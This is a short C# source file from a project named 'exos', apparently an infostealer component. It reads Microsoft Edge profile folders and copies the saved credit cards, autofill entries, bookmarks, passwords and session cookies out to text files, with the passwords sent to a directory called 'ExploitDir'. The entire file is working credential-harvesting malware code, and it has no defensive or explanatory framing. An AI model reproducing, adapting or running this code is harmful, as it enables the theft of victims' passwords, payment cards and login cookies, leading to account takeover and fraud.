using System.Collections.Generic;
using System.IO;
using exos.Chromium;

namespace exos.Edge;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		string path = Paths.lappdata + Paths.EdgePath;
		if (!Directory.Exists(path))
		{
			return;
		}
		string text = sSavePath + "\\Edge";
		Directory.CreateDirectory(text);
		string[] directories = Directory.GetDirectories(path);
		foreach (string text2 in directories)
		{
			if (File.Exists(text2 + "\\Login Data"))
			{
				List<CreditCard> cCC = CreditCards.Get(text2 + "\\Web Data");
				List<AutoFill> aFills = Autofill.Get(text2 + "\\Web Data");
				List<Bookmark> bBookmarks = Bookmarks.Get(text2 + "\\Bookmarks");
				List<Password> pPasswords = exos.Chromium.Passwords.Get(text2 + "\\Login Data");
				List<Cookie> cCookies = exos.Chromium.Cookies.Get(text2 + "\\Cookies");
				cBrowserUtils.WriteCreditCards(cCC, text + "\\CreditCards.txt");
				cBrowserUtils.WriteAutoFill(aFills, text + "\\AutoFill.txt");
				cBrowserUtils.WriteBookmarks(bBookmarks, text + "\\Bookmarks.txt");
				cBrowserUtils.WritePasswords(pPasswords, Helper.ExploitDir + "\\Passwords.txt");
				cBrowserUtils.WriteCookies(cCookies, sSavePath + $"\\Cookies_Edge({GenStrings.GenNumbersTo()}).txt");
			}
		}
	}
}
